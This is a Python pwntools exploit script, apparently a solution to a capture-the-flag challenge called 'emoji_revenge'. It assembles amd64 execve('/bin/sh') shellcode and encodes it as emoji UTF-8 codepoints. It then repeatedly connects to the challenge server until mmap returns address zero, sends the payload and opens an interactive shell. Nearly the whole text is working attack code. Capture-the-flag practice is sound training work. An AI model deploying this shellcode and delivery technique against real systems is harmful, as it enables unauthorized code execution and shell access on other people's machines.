#!/usr/bin/env python3
from pwn import *


def utf32_to_utf8(codepoints):
    result = bytearray()
    for codepoint in codepoints:
        b = '{:b}'.format(codepoint)
        if len(b) <= 7:
            ch = '0'
            cont_chars = 0
        elif len(b) <= 11:
            ch = '110'
            cont_chars = 1
        elif len(b) <= 16:
            ch = '1110'
            cont_chars = 2
        elif len(b) <= 21:
            ch = '11110'
            cont_chars = 3
        elif len(b) <= 26:
            ch = '111110'
            cont_chars = 4
        elif len(b) <= 31:
            ch = '1111110'
            cont_chars = 5
        else:
            assert False, hex(codepoint)
        first_bits = 8 - len(ch)
        b = b.rjust(first_bits + 6 * cont_chars, '0')
        ch += b[:first_bits]
        b = b[first_bits:]
        for i in range(cont_chars):
            ch += '10' + b[:6]
            b = b[6:]
        for i in range(0, len(ch), 8):
            result.append(int(ch[i:i + 8], 2))
    return bytes(result)

TEST_BEER = utf32_to_utf8((0x1f37a,))
assert TEST_BEER == b'\xf0\x9f\x8d\xba', TEST_BEER.hex()

ASM = asm('''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    .byte 0x66  # !
    nop  # !
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    nop  # !
    mov rsi, rsp
    nop  # !
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
    .byte 0, 0
''', arch='amd64')
SHELL = bytearray(b'\x50' * (130 * 4))  # push %rax
SHELL[0x100 - len(ASM):0x100] = ASM
SHELL[0x200:0x202] = b'\xeb\xfe'  # jmp .
print(disasm(SHELL, arch='amd64'))
EMOLOOP = utf32_to_utf8(
    struct.unpack('<I', SHELL[i:i + 4])[0]
    for i in range(0, len(SHELL), 4)
)


def connect():
    if not args.LOCAL:
        return remote('chall.0ops.sjtu.edu.cn', 31323)
    return process(['./emoji_revenge.dbg'])
    return process(['valgrind', './emoji_revenge.dbg'])
    return gdb.debug(['./emoji_revenge.dbg'], gdbscript='''
set breakpoint pending on
b alarm
commands
  # set $rdi = 3
  c
end
b __GI__IO_wfile_sync
c
''')


def zero(tube):
    try:
        while True:
            tube.sendline('🍺')
            tube.recvuntil('mmap() at @')
            addr = tube.recvline()
            if addr == b'(nil)\n':
                return True
    except:
        return False


def main():
    while True:
        with connect() as tube:
            if not zero(tube):
                continue
            tube.sendline('🐴')
            # 70 causes jump to 0, obtained by trial and error
            kaboom = bytearray(EMOLOOP + ('🐮' * 70).encode())
            tube.send(bytes(kaboom))
            tube.interactive()


if __name__ == '__main__':
    main()
